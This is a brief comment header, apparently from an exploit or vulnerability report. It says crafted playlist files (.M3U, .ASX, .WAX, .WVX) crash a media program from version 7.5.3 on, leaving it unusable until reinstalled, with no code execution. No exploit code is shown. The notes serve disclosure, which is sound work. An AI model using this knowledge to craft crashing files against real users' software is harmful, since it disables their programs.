#
# Behavior is different than in the 7.1.X stuff.
#
# On versions 7.5.3 and higher these files will actually creates a "DoS" for the program.
# It does not look like code execution is possible, instead the program becomes unusable. 
#
# After opening one of these files, whether it be .M3U as I reported earlier 
# or .ASX/.WAX/.WVX now, the program becomes trashed. Exception is thrown in MSVCR9.DLL. 
#
# The only fix is to uninstall the program and reinstall from the original source to 
# restore functionality.
